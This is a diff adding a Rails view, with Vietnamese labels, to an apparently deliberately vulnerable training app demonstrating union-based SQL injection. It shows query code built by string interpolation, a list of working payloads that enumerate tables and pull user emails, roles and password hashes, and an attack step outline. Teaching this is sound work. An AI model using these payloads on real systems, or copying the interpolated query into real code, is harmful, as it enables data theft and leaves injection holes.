@@ -1,0 +1,99 @@
+<div class="container mt-4">
+  <h2>Union-based SQL Injection Demo</h2>
+  <div class="alert alert-danger">
+    <strong>Cực kỳ nguy hiểm:</strong> Có thể trích xuất toàn bộ database!
+  </div>
+
+  <div class="row">
+    <div class="col-md-6">
+      <h4>Event Search (Vulnerable)</h4>
+      <%= form_with url: sqli_union_demo_path, method: :get, local: true, class: "border p-3 bg-light" do |f| %>
+        <div class="mb-3">
+          <%= f.label :search, "Search Events:", class: "form-label" %>
+          <%= f.text_field :search, class: "form-control", 
+                          placeholder: "Thử: ' UNION SELECT id,email,role FROM users--" %>
+        </div>
+        <%= f.submit "Search", class: "btn btn-primary" %>
+      <% end %>
+      
+      <% if defined?(@events) %>
+        <div class="mt-3">
+          <h5>Kết quả tìm kiếm:</h5>
+          <% if @events.any? %>
+            <% @events.each do |event| %>
+              <div class="card mb-2">
+                <div class="card-body">
+                  <h6 class="card-title">ID: <%= event.id %></h6>
+                  <p class="card-text">
+                    <strong>Title:</strong> <%= event.title %><br>
+                    <strong>Description:</strong> <%= event.description %>
+                  </p>
+                </div>
+              </div>
+            <% end %>
+          <% else %>
+            <div class="alert alert-info">Không tìm thấy event nào</div>
+          <% end %>
+        </div>
+      <% end %>
+    </div>
+    
+    <div class="col-md-6">
+      <h4>Union-based Payloads:</h4>
+      <div class="list-group">
+        <div class="list-group-item">
+          <strong>Test số cột:</strong><br>
+          <code>' UNION SELECT NULL,NULL,NULL--</code>
+        </div>
+        
+        <div class="list-group-item">
+          <strong>Lấy version & database:</strong><br>
+          <code>' UNION SELECT 1,@@version,database()--</code>
+        </div>
+        
+        <div class="list-group-item">
+          <strong>Lấy tên bảng:</strong><br>
+          <code>' UNION SELECT 1,table_name,'table' FROM information_schema.tables--</code>
+        </div>
+        
+        <div class="list-group-item">
+          <strong>Lấy thông tin users:</strong><br>
+          <code>' UNION SELECT id,email,role FROM users--</code>
+        </div>
+        
+        <div class="list-group-item">
+          <strong>Lấy password hash:</strong><br>
+          <code>' UNION SELECT id,email,password_digest FROM users--</code>
+        </div>
+        
+        <div class="list-group-item">
+          <strong>Lấy admin users:</strong><br>
+          <code>' UNION SELECT id,email,role FROM users WHERE role='admin'--</code>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="mt-4">
+    <h4>Code vulnerable:</h4>
+    <pre class="bg-dark text-light p-3"><code>search_term = params[:search]
+sql = "SELECT id, title, description FROM events WHERE title LIKE '%#{search_term}%'"
+@events = Event.find_by_sql(sql)</code></pre>
+  </div>
+  
+  <div class="mt-3">
+    <h4>Ví dụ SQL được tạo ra:</h4>
+    <pre class="bg-warning p-3"><code>SELECT id, title, description FROM events WHERE title LIKE '%' UNION SELECT id,email,role FROM users--%'</code></pre>
+  </div>
+  
+  <div class="mt-3 alert alert-info">
+    <strong>Các bước tấn công Union-based SQLi:</strong>
+    <ol>
+      <li><strong>Xác định số cột:</strong> Test với NULL,NULL,NULL...</li>
+      <li><strong>Xác định kiểu dữ liệu:</strong> Test với 1,'string','string'...</li>
+      <li><strong>Lấy thông tin hệ thống:</strong> @@version, database(), user()...</li>
+      <li><strong>Lấy cấu trúc DB:</strong> information_schema.tables, columns...</li>
+      <li><strong>Trích xuất dữ liệu:</strong> SELECT từ các bảng quan trọng</li>
+    </ol>
+  </div>
+</div>
